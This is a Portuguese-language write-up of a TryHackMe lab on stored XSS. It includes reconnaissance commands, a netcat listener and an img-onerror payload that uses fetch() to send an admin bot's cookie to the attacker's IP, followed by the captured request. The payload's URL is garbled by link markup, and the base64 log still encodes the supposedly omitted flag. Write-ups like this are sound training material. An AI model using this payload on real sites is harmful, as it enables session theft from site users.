# Write-up: Cupid's Matchmaker (TryHackMe)
**Data:** 18 de Fevereiro de 2026
**Categoria:** Web / XSS
**Dificuldade:** Easy
**Analista:** Bruno Braga

---

## 1. Introdução
O desafio **Cupid's Matchmaker** simula uma plataforma de relacionamentos para o Dia dos Namorados. O objetivo técnico é explorar uma vulnerabilidade de **Stored XSS** no formulário de pesquisa (`/survey`) para capturar cookies de um administrador e obter a flag.

## 2. Reconhecimento e Enumeração

### Varredura de Serviços
O primeiro passo foi identificar a tecnologia do servidor na porta `5000`:
* **Comando:** `curl -I http://10.67.145.155:5000`
* **Tecnologia:** O cabeçalho `Server: Werkzeug/3.0.1 Python/3.12.3` confirmou que a aplicação utiliza o framework **Flask**.

### Mapeamento de Diretórios
Utilizando o `gobuster`, identificamos as rotas principais:
* `/login`: Interface de autenticação administrativa.
* `/admin`: Painel restrito (redirecionava para login com erro de acesso).
* `/survey`: Formulário público para coleta de dados.

## 3. Exploração: Stored XSS (Cookie Stealing)
A página `/survey` informava que "humanos reais" analisariam as respostas. Isso indicou que o conteúdo enviado seria renderizado no navegador de um bot de administração.

### Preparação do Listener
No terminal do AttackBox (IP `10.67.110.240`), configuramos um listener para aguardar a conexão de volta:
* **Comando:** `nc -lvnp 4444`

### Injeção do Payload
Inserimos o seguinte código no campo de texto da pesquisa para exfiltrar o cookie do administrador em formato Base64:

```html
<img src="x" onerror="fetch('[http://10.67.110.240:4444/?cookie='+btoa(document.cookie](http://10.67.110.240:4444/?cookie='+btoa(document.cookie)))"> 
```

## 4. Captura e Decodificação
Após o envio, o bot acessou a resposta e enviou a requisição para o nosso terminal:

Log capturado no Netcat:

```html
Connection received on 10.67.145.155
GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1
```

### Extração da Flag
O valor foi decodificado utilizando o utilitário base64:

Comando: echo "ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59" | base64 -d

Flag Final: THM{Flag omitida ;D}
